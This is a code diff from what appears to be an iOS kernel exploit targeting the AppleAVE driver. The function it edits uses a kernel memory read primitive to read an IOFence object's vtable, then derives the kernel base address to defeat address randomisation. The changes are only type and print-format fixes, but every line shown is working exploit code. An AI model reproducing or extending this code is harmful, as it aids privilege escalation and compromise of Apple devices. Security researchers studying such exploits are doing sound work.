@@ -284,12 +284,12 @@ cleanup:
  * Returns:			kern_return_t and the kernel base in the output params.
  */
 
-kern_return_t kernel_read_leak_kernel_base(void ** kernel_base) {
+kern_return_t kernel_read_leak_kernel_base(uint64_t * kernel_base) {
 	
 	kern_return_t ret = KERN_SUCCESS;
 	uint64_t value = 0;
 	void * iofence = NULL;
-	void * iofence_vtable = NULL;
+	uint64_t iofence_vtable = 0;
 
 	/* Read the IOFence object first */
 	ret = kernel_read_read_address((char*)apple_ave_pwn_get_bad_surface_kernel_ptr() + 0x210, &value,
@@ -309,8 +309,7 @@ kern_return_t kernel_read_leak_kernel_base(void ** kernel_base) {
 	//printf("[INFO]:IOFence, real: %p", (void*)r64(apple_ave_pwn_get_bad_surface_kernel_ptr() + 0x210));
 
 	/* Read the vtable from the IOFence object */
-	ret = kernel_read_read_address(iofence, &value, 
-		OFFSET(iofence_vtable_offset), 0xfff);
+	ret = kernel_read_read_address(iofence, &value, OFFSET(iofence_vtable_offset), 0xfff);
 	if (KERN_SUCCESS != ret)
 	{
 		printf("[ERROR]: leaking IOFence's vtable\n");
@@ -318,9 +317,9 @@ kern_return_t kernel_read_leak_kernel_base(void ** kernel_base) {
 	}
 
 	value |= 0xfffffff000000000;
-	iofence_vtable = (void*)value;
+	iofence_vtable = value;
 
-	printf("[INFO]:IOFence's vtable: %p\n", iofence_vtable);
+	printf("[INFO]: IOFence's vtable: %llx\n", iofence_vtable);
 	//printf("[INFO]:IOFence's vtable, real: %p", (void*)r64(r64(apple_ave_pwn_get_bad_surface_kernel_ptr() + 0x210)));
 
 	*kernel_base = (iofence_vtable - OFFSET(iofence_vtable_offset));
